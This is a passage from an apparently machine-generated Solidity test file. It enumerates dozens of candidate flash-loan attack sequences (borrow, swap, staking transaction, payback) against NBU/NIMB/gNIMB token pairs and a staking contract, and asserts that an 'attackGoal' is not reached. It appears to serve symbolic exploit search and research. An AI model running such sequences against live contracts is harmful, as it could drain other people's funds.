        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4157(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4158(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4159(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4160(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4161(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4162(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4163(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4164(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4165(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4166(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4167(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4168(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4169(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4170(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4171(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4172(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4173(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4174(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4175(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4176(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4177(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4178(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4179(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4180(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4181(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4182(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4183(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4184(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4185(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4186(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4187(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4188(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4189(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4190(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4191(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4192(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4193(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4194(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4195(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4196(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4197(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4198(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4199(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4200(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4201(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4202(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
